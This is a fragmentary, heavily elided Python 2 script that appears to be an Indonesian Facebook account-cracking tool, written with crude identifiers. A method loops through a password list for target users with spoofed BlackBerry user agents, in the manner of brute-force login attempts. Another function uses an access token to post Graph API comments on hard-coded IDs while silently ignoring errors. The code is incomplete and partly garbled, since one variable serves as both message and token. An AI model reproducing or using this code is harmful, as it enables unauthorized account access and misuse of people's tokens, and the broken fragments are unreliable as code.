...
def yayanxd():
    ...
    if kontol in ('open', 'Open', 'OPEN'):
        ...
        print '%s *%s Lalu tempelkan di Kolom. Klik %sPencarian'%(B,N,H);time.sleep(2)
        print '%s *%s Kalau Sudah %sDownload Ke Chroome%s Selesei %sSemoga%s Anda Paham.'%(B,N,H,N,H,N);time.sleep(2)
...
def wuhan(kontol):
	...
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,kontol,kontol))
        ...
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,kontol,kontol))
    except:
    	pass
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
                ...
                _kontol = 'BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103'
                _kontol = 'BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104'
